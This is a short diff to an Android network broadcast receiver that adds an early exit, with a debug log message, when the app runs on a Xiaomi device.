@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.qm.AppRuntime;
 import com.xstd.qm.Config;
 import com.xstd.qm.DemonService;
 import com.xstd.qm.UtilOperator;
@@ -21,6 +22,13 @@ public class NetworkBroadcastReceiver extends BroadcastReceiver {
 
     public void onReceive(final Context context, Intent intent) {
         Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] Entry >>>>>>>>");
+
+        if (AppRuntime.isXiaomiDevice()) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
+            }
+            return;
+        }
 
         String path = SettingManager.getInstance().getLocalApkPath();
 
